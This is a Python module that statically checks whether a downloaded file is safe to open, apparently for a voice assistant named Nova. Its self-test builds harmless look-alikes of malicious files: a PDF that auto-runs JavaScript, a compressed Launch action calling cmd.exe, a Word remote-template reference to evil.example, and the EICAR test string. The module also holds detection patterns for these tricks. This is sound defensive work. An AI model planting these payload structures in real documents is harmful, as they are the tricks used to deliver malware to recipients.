"""Is this downloaded file safe to open? Static checks (no file is ever opened or run) + ClamAV if installed.
check(path) -> (verdict, reasons): "danger" = don't open, "warn" = be careful, "clean" = nothing found.
Catches the tricks freelance scams use: a program dressed as a document, PDFs that run code or launch
things, Office macros / remote templates / embedded objects, password-protected archives, and phishing links."""
import os, re, shutil, subprocess, zipfile, zlib

PROGRAM_EXT = {".exe", ".scr", ".com", ".bat", ".cmd", ".msi", ".js", ".jse", ".vbs", ".vbe", ".wsf", ".hta", ".ps1",
               ".jar", ".app", ".pkg", ".dmg", ".command", ".sh", ".lnk", ".iso", ".img", ".apk", ".reg", ".cpl",
               ".html", ".htm", ".svg", ".xhtml", ".url", ".webloc", ".terminal", ".scpt", ".docm", ".xlsm", ".pptm"}
MAGIC = [(b"%PDF", "pdf"), (b"PK\x03\x04", "zip"), (b"\xd0\xcf\x11\xe0", "ole"), (b"MZ", "exe"),
         (b"\xcf\xfa\xed\xfe", "macho"), (b"\xca\xfe\xba\xbe", "macho"), (b"\xfe\xed\xfa", "macho"), (b"#!", "script"),
         (b"{\\rtf", "rtf"), (b"Rar!", "rar"), (b"7z\xbc\xaf", "7z"), (b"\x1f\x8b", "gzip")]
EXPECT = {".pdf": "pdf", ".docx": "zip", ".xlsx": "zip", ".pptx": "zip", ".zip": "zip", ".doc": "ole", ".xls": "ole",
          ".ppt": "ole", ".rtf": "rtf", ".rar": "rar", ".7z": "7z"}
PHISH = re.compile(rb"verify your (account|identity)|log ?in to (view|access|download)|enter your (password|card)|"
                   rb"gift ?card|crypto ?wallet|seed phrase|whats ?app|telegram\.me|t\.me/|wa\.me/|confirm (the|your) order", re.I)
SAFE_HOSTS = ("fiverr.com", "upwork.com", "contra.com", "microsoft.com", "openxmlformats.org", "w3.org",
              "adobe.com", "purl.org", "schemas.openxmlformats.org")


def _kind(head):
    return next((k for m, k in MAGIC if head.startswith(m)), "html" if re.match(rb"\s*<(!doctype|html|script|svg)", head, re.I) else "other")


def _hosts(blob):
    hs = {h.decode().lower() for h in re.findall(rb"https?://([a-z0-9.-]+\.[a-z]{2,})", blob, re.I)}
    return sorted(h for h in hs if not h.endswith(SAFE_HOSTS))


def _pdf(raw):
    out, danger = [], []
    blob = raw
    for s in re.findall(rb"stream\r?\n(.*?)endstream", raw, re.S)[:400]:     # unpack compressed streams to see inside
        try: blob += zlib.decompress(s)
        except Exception: pass
    for key, why in [(rb"/JavaScript|/JS\b", "runs JavaScript when opened"), (rb"/Launch", "tries to launch a program"),
                     (rb"/EmbeddedFile", "has a hidden file inside"), (rb"/RichMedia|/XFA", "has active content"),
                     (rb"/SubmitForm", "sends form data to a website")]:
        if re.search(key, blob): danger.append(why)
    hs = _hosts(blob)
    if hs: out.append("links to " + ", ".join(hs[:3]))
    if PHISH.search(blob): out.append("phishing words (login, payment, WhatsApp or order-confirm)")
    return danger, out


def _zip(path):
    danger, warn = [], []
    try:
        z = zipfile.ZipFile(path)
    except zipfile.BadZipFile:
        return ["is a broken or disguised archive"], []
    names = z.namelist()
    if any(i.flag_bits & 1 for i in z.infolist()):
        warn.append("is password-protected, so it can't be scanned (a common malware trick)")
    for n in names:
        low = n.lower()
        if "vbaproject.bin" in low: danger.append("contains macros (code that runs inside Office)")
        if "activex" in low: danger.append("contains ActiveX controls")
        if "oleobject" in low or low.startswith(("word/embeddings", "xl/embeddings", "ppt/embeddings")):
            warn.append("has an embedded object")
        if os.path.splitext(low)[1] in PROGRAM_EXT - {".html", ".htm", ".svg"}:
            danger.append("hides a program inside (%s)" % os.path.basename(n))
        if low.endswith((".zip", ".rar", ".7z")): warn.append("has another archive inside")
    rels = b""
    for n in names:
        if n.endswith(".rels") and not any(i.flag_bits & 1 for i in z.infolist() if i.filename == n):
            try: rels += z.read(n)
            except Exception: pass
    if re.search(rb'(attachedTemplate|oleObject|frame)[^>]*Target="https?://', rels, re.I):
        danger.append("loads a template or object from the internet when opened")
    hs = _hosts(b" ".join(re.findall(rb'Target="(https?://[^"]+)"[^>]*TargetMode="External"', rels)))
    if hs: warn.append("links to " + ", ".join(hs[:3]))
    return sorted(set(danger)), sorted(set(warn))


def _clam(path):
    exe = shutil.which("clamscan") or next((p for p in ("/opt/homebrew/bin/clamscan", "/usr/local/bin/clamscan") if os.path.exists(p)), None)
    if not exe: return None
    try:
        r = subprocess.run([exe, "--no-summary", "--infected", path], capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return None
    if r.returncode == 1:
        return r.stdout.strip().rsplit(":", 1)[-1].replace("FOUND", "").strip() or "malware"
    return "" if r.returncode == 0 else None          # 2 = error (e.g. no signatures yet)


def check(path):
    name = os.path.basename(path)
    ext = os.path.splitext(name)[1].lower()
    danger, warn = [], []
    if "‮" in name: danger.append("uses a hidden trick to fake its file extension")
    if re.search(r"\.(pdf|docx?|xlsx?|jpg|png|txt)\s*\.\w+$", name, re.I) and ext not in (".zip",):
        danger.append("has a double extension (looks like a document, is really %s)" % ext)
    if ext in PROGRAM_EXT:
        danger.append("is a program or web page (%s), not a document" % ext)
    with open(path, "rb") as f:
        head = f.read(16)
    kind = _kind(head)
    if ext in EXPECT and kind != EXPECT[ext]:
        danger.append("says %s but is really %s" % (ext, {"exe": "a Windows program", "macho": "a Mac program",
                      "script": "a script", "html": "a web page"}.get(kind, "something else")))
    if kind in ("exe", "macho", "script") and not any("program" in d for d in danger):
        danger.append("is a program, not a document")
    if os.path.getsize(path) <= 64 * 2**20:
        if kind == "pdf":
            d, w = _pdf(open(path, "rb").read()); danger += d; warn += w
        elif kind == "zip":
            d, w = _zip(path); danger += d; warn += w
        elif kind == "ole":
            raw = open(path, "rb").read()
            if re.search(rb"_VBA_PROJECT|Macros|VBA", raw): danger.append("contains macros (code that runs inside Office)")
            else: warn.append("is an old Office format that can hide code")
        elif kind == "rtf" and re.search(rb"\\objdata|\\objupdate|\\objautlink", open(path, "rb").read()):
            danger.append("has an embedded object, a known exploit trick")
        elif kind in ("rar", "7z", "gzip"):
            warn.append("is an archive Nova can't look inside")
    v = _clam(path)
    if v: danger.insert(0, "antivirus found malware: " + v)
    elif v is None: warn.append("antivirus scan didn't run")
    return ("danger" if danger else "warn" if warn else "clean"), danger + warn


def spoken(path):
    """-> (verdict, one sentence for Nova to say, reasons)"""
    verdict, why = check(path)
    name = re.sub(r"[_-]+", " ", os.path.splitext(os.path.basename(path))[0])[:40]
    if verdict == "danger":
        return verdict, "Sir, don't open %s. It %s. Delete it and report the buyer." % (name, why[0]), why
    if verdict == "warn":
        return verdict, "Sir, be careful with %s: it %s." % (name, " and ".join(why[:2])), why
    return verdict, "Sir, %s looks clean. No malware or scam tricks found." % name, why


if __name__ == "__main__":       # self-check: build harmless look-alikes of each trick and make sure each is caught
    import sys, tempfile
    if len(sys.argv) > 1:
        for p in sys.argv[1:]: print(check(p), "|", spoken(p)[1])
        sys.exit()
    d = tempfile.mkdtemp()
    def mk(n, data):
        p = os.path.join(d, n); open(p, "wb").write(data); return p
    def mkzip(n, files, flag=0):
        p = os.path.join(d, n)
        with zipfile.ZipFile(p, "w") as z:
            for k, v in files.items(): z.writestr(k, v)
        if flag:                                   # mark entries encrypted (flag bit 0)
            b = bytearray(open(p, "rb").read())
            for m in re.finditer(rb"PK\x03\x04|PK\x01\x02", b):
                o = m.start() + (6 if b[m.start() + 2] == 3 else 8); b[o] |= 1
            open(p, "wb").write(bytes(b))
        return p
    _clam_real, _clam = _clam, (lambda p: "")      # signatures tested separately (EICAR below)
    pdf_ok = mk("brief.pdf", b"%PDF-1.4\n1 0 obj <</Type/Catalog>> endobj\n(Please build a bot for our HR policies) %%EOF")
    pdf_js = mk("invoice.pdf", b"%PDF-1.4\n1 0 obj <</OpenAction <</S/JavaScript/JS(app.alert(1))>> >> endobj %%EOF")
    pdf_c = mk("order.pdf", b"%PDF-1.4\n2 0 obj <</Filter/FlateDecode>> stream\n" + zlib.compress(b"/Launch /F (cmd.exe)") + b"\nendstream %%EOF")
    pdf_ph = mk("925.pdf", b"%PDF-1.4\n(Log in to view your order) /URI (https://trusttoford.com/x) %%EOF")
    exe_pdf = mk("brief2.pdf", b"MZ\x90\x00" + b"\x00" * 64)
    dbl = mk("requirements.pdf.exe", b"MZ" + b"\x00" * 64)
    docx_ok = mkzip("spec.docx", {"[Content_Types].xml": "<x/>", "word/document.xml": "<w>Need a chatbot</w>"})
    docm = mkzip("spec2.docx", {"[Content_Types].xml": "<x/>", "word/vbaProject.bin": "x"})
    tmpl = mkzip("spec3.docx", {"word/_rels/settings.xml.rels":
                                 '<Relationship Type=".../attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/>'})
    enc = mkzip("files.zip", {"data.xlsx": "x"}, flag=1)
    inner = mkzip("docs.zip", {"brief.pdf.scr": "MZ"})
    for p, want in [(pdf_ok, "clean"), (docx_ok, "clean"), (pdf_js, "danger"), (pdf_c, "danger"), (pdf_ph, "warn"),
                    (exe_pdf, "danger"), (dbl, "danger"), (docm, "danger"), (tmpl, "danger"), (enc, "warn"), (inner, "danger")]:
        got = check(p)
        assert got[0] == want, (os.path.basename(p), want, got)
    assert "trusttoford.com" in " ".join(check(pdf_ph)[1])
    _clam = _clam_real
    if shutil.which("clamscan") or os.path.exists("/opt/homebrew/bin/clamscan"):
        eicar = mk("test.pdf", b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")   # harmless AV test string
        v = check(eicar)
        assert v[0] == "danger", v
        print("clamav ok:", v[1][0][:60])
    shutil.rmtree(d)
    print("filecheck ok")
